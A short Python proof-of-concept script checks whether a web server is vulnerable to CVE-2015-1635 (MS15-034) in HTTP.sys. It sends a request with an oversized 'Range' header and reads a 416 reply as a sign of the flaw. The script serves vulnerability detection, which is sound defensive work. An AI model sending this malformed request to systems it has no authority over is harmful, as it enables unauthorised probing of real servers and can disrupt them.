#!/usr/bin/env python3
# CVE-2015-1635 PoC

import requests
import sys

if len(sys.argv) < 2:
    print("""
    CVE-2015-1635_PoC.py
    HTTP.sys Remote Code Execution detection (CVE-2015-1635 PoC) (MS15-034 PoC)
    usage:
        python3 CVE-2015-1635_PoC.py <URL>
    e.g.
        python3 CVE-2015-1635_PoC.py http://www.xxx.com
        """)
else:
    url = sys.argv[1]
    kv = { "Range" : "bytes=0-18446744073709551615" }
    try:
        response = requests.get(url, headers = kv, timeout = 30)
        if response.status_code == 416:
            print("\033[31m[!] Find Vulnerabilities!\033[0m")
        else:
            print("\033[32m[!] Safe\033[0m")
    except:
        print("\033[33m[!] HTTP Error!\033[0m")
    